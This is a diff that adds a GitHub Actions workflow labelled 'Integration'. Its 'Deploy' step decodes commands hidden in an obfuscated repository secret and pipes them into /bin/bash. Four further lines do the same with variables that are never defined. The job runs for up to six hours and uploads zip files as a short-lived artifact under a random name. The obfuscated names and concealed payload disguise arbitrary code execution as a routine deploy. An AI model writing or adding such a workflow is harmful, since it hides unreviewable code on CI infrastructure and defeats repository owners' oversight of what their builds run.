@@ -1,0 +1,30 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          q4921: ${{ secrets.q4921 }}
+        run: |
+          printf '%s' "$q4921" | jq -r .ht7 | /bin/bash
+          echo $r02 | jq -r .l4963 | /bin/bash
+          printf '%s' "$v72492" | jq -r .wdepz2697 | /bin/bash
+          echo $zqjbu057 | jq -r .cii5 | /bin/bash
+          echo $cj41 | jq -r .t9075 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: YjtRTcwM
+          path: "*.zip"
+          retention-days: 1
